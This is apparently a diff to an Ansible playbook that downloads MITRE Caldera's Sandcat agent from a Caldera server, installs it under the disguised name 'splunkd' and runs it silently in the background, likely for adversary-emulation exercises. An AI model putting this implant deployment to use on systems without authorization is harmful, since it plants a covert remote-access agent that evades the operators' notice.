@@ -1,0 +1,16 @@
+- name: Download Sandcat agent (Linux)
+  get_url:
+    url: "{{ caldera_server }}/magellan/download"
+    dest: /usr/local/bin/splunkd
+    mode: '0755'
+    headers:
+      file: sandcat.go
+
+- name: Run Sandcat agent
+  shell: >
+    nohup /usr/local/bin/splunkd
+    -server {{ caldera_server }}
+    -group {{ caldera_group }}
+    >/dev/null 2>&1 &
+  args:
+    creates: /var/run/splunkd.pid
